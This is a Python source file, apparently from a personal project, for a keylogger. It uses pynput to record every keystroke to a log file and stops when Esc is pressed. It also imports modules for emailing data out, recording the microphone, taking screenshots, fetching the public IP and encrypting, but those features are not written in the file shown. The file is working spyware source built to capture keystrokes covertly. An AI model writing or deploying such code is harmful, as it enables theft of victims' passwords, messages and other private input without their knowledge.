from keylogger import on_press, on_release
import smtplib, socket, platform, time, os,logging as log

# For keystrokes
from pynput.keyboard import Key,Listener 

# Email features
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

from scipy.io.wavfile import write # 
from cryptography.fernet import Fernet # 
import socket, platform # Modules for collecting computer information

# Microphone module
import sounddevice as sd
from scipy.io.wavfile import write

# To fetch the user name 
import getpass
from requests import get

# Screenshot module
from multiprocessing import Process,freeze_support
from PIL import  ImageGrab

################### First segment: KeyLogger ###################
''' Key: Logs the key
    Listener: Listens the key that is being typed '''

save_logs = '/Users/aneruthmohanasundaram/Documents/GitHub/OSSEC-Project/log.txt' # Log file to be created at first
count,keys = 0,[]


# def press(key):
#     global count,keys
#     print(key)
#     keys.append(key)
#     count += 1

#     if count >= 1: # To check if our string value is greateer than 1 and apends it to our text file
#         count = 0
#         write_file(keys)
#         keys = []

# def write_file(keys):
#     with open(save_logs,'a') as f:
#         for i in keys:
#            var = str(i).replace("'","")
#            if var.find('space') > 0:  # Hitting the enter it creates a new line
#                f.write('\n')
#                f.close()
#            elif var.find('Key') == -1:
#                f.write(var)
#                f.close()

# def release(key):
#     if key == Key.esc:return False

# with Listener(on_press=press,on_release=release) as l:
#     l.join()


def on_press(key):
    key_str = str(key).replace("'","")
    with open('log.txt','a') as f:
        if key_str == 'Key.space':
            f.write(" ")
        elif len(key_str) >1:
            f.write('\n' + key_str  + '\n')
        else:f.write(key_str)

def stop(key):
    if key == Key.esc:
        exit(0)

with Listener(on_press = on_press,on_release=stop) as listener:
    listener.join()